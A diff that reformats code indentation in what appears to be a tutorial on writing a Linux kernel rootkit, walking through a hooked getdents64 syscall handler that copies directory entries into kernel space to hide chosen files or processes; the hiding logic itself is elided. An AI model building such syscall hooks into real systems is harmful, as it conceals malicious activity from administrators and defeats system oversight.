@@ -1566,97 +1566,96 @@ MODULE_VERSION("1.0");
 
    Let us go step by step from `Test_hook_getdents64.h` file:
 ```c
-                   // Test_hook_getdents64.h
+// Test_hook_getdents64.h
 
-                   #include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
-                   #include <linux/fdtable.h>      /* Open file table structure: files_struct structure */
-                   #include <linux/proc_ns.h>      /* For `PROC_ROOT_INO` */
+#include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
+#include <linux/fdtable.h>      /* Open file table structure: files_struct structure */
+#include <linux/proc_ns.h>      /* For `PROC_ROOT_INO` */
 
-                   // =============================================================================
+// =============================================================================
 
-                   #include <linux/dirent.h>	/* struct dirent refers to directory entry. */
+#include <linux/dirent.h>	/* struct dirent refers to directory entry. */
 
-                    struct linux_dirent {
-                            unsigned long   d_ino;		/* inode number */
-                            unsigned long   d_off;		/* offset to the next dirent */
-                            unsigned short  d_reclen;	/* length of this record */
-                            char            d_name[1];	/* filename */
-                    };
+struct linux_dirent {
+    unsigned long   d_ino;		/* inode number */
+    unsigned long   d_off;		/* offset to the next dirent */
+    unsigned short  d_reclen;	/* length of this record */
+    char            d_name[1];	/* filename */
+};
 
-                   static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
-                   {
-                      /* Dependent registers:
-                       * rax: contains syscall ids = 0xd9
-                       * rdi: which contains the file descriptor = unsigned int fd
-                       * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
-                       * rdx: length of the passed argument(or string) = unsigned int count
-                       */
+static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
+{
+/* Dependent registers:
+* rax: contains syscall ids = 0xd9
+* rdi: which contains the file descriptor = unsigned int fd
+* rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" => this pointer resides in user space
+* rdx: length of the passed argument(or string) = unsigned int count
+*/
 
-	                    // Storing file descriptor 
-	                    int fd = (int) pt_regs->di;
+    // Storing file descriptor 
+    int fd = (int) pt_regs->di;
 
-	                    /* User space related variable
-                       * Storing the name of the directory passed from user space via "si" register
-                       */
-	                    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
+    /* User space related variable
+* Storing the name of the directory passed from user space via "si" register
+*/
+    struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
 
-	                    int ret = orig_getdents64(pt_regs), err;
-                        ...
+    int ret = orig_getdents64(pt_regs), err;
+...
 ```
-    linux/slab.h: Will be used to allocate memories in ram for directory entries.
-    linux/fdtable.h: For accessing file table structure.
-    linux/proc_ns.h: For using `PROC_ROOT_INO`. I will explain it, when the time comes.
+linux/slab.h: Will be used to allocate memories in ram for directory entries.
+linux/fdtable.h: For accessing file table structure.
+linux/proc_ns.h: For using `PROC_ROOT_INO`. I will explain it, when the time comes.
 
-    Now to the next part:
+Now to the next part:
 ```c
-                    ...
-                   // kernel space related variables
-                   unsigned short proc = 0;
-                   unsigned long offset = 0; 
-                   struct linux_dirent64 *dir, *kdirent, *prev = NULL;
+...
+	// kernel space related variables
+	unsigned short proc = 0;
+	unsigned long offset = 0; 
+	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
 
-                   //For storing the directory inode value
-                   struct inode *d_inode;
+	//For storing the directory inode value
+	struct inode *d_inode;
 
-                   if (ret <= 0)
-                          return ret;
+	if (ret <= 0)
+		return ret;
 
-                   /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
-                   * 
-                   * kzalloc - allocate memory. The memory is set to zero.
-                   * @size: how many bytes of memory are required.
-                   * @flags: the type of memory to allocate (see kmalloc).
-                   *
-                   * static inline void *kzalloc(size_t size, gfp_t flags)
-                   */
-                   /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
-                   *
-                   * Below is a brief outline of the most useful GFP flags
-                   * %GFP_KERNEL
-                   *      Allocate normal kernel ram. May sleep.
-                   */
-                   kdirent = kzalloc(ret, GFP_KERNEL);
+	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
+	 * 
+ 	 * kzalloc - allocate memory. The memory is set to zero.
+	 * @size: how many bytes of memory are required.
+	 * @flags: the type of memory to allocate (see kmalloc).
+	 *
+	 * static inline void *kzalloc(size_t size, gfp_t flags)
+	 */
+	 /* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
+	  *
+	  * Below is a brief outline of the most useful GFP flags
+	  * %GFP_KERNEL
+	  *      Allocate normal kernel ram. May sleep.
+	  */
+	kdirent = kzalloc(ret, GFP_KERNEL);
+	
+	if (kdirent == NULL)
+		return ret;
+   
+	// Copying directory name (or pid name) from userspace to kernel space
+	err = copy_from_user(kdirent, dirent, ret);
+	if (err)
+		goto out;
+	 ...
 
-                   if (kdirent == NULL)
-                           return ret;
-                   
-                   // Copying directory name (or pid name) from userspace to kernel space
-                   err = copy_from_user(kdirent, dirent, ret);
-                   if (err)
-                      goto out;
+	err = copy_to_user(dirent, kdirent, ret);
 
-                    ...
+	   if (err)
+	   {
+	     goto out;
+	   }
 
-                   err = copy_to_user(dirent, kdirent, ret);
-
-                   if (err)
-                   {
-                     goto out;
-                   }
-
-                   out:
-                      kfree(kdirent);
-                      return ret;
+	   out:
+	      kfree(kdirent);
+	      return ret;
 ```
     Those kernel space and user space variables will mostly be used in `copy_from_user` and `copy_to_user` functions as we are going to pass arguments from _user space variable_ to _kernel space variable_ and vice-versa. Being in user space we can't read kernel space pointers/variables and vice-versa, that's the reason why `copy_from_user` and `copy_to_user` functions will be used.\
      In this scenario, `copy_from_user` is used to pass the name of the passed _directory name_ to kernel mode variable, _kdirent_ and then we will hide whatever we want to hide and lastly, we will send the output using `copy_to_user` to the user space variable, _dirent_.
